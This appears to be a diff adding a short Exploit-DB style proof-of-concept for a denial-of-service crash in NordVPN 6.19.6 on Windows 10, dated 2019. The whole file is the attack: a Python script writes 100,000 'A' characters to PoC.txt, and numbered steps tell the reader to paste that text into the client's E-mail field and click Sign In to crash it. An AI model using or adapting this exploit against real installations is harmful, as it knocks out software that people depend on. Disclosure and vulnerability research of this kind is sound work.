@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: NordVPN 6.19.6 - Denial of Service (PoC)
+# Date: 07/02/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://nordvpn.com/
+# Software Link: https://downloads.nordcdn.com/apps/windows/10/NordVPN/latest/NordVPNSetup.exe
+# Version: 6.19.6
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script, it will create a new file "PoC.txt"
+# 2.- Copy the text from the generated PoC.txt file to clipboard
+# 3.- Open NordVPN.exe 
+# 3.- Paste clipboard in 'E-mail' field
+# 4.- Write '1234' in 'Password' field
+# 5.- Clic on button -> Sign In
+# 6.- Crashed
+
+buffer = "\x41" * 100000
+f = open ("PoC.txt", "w")
+f.write(buffer)
+f.close()
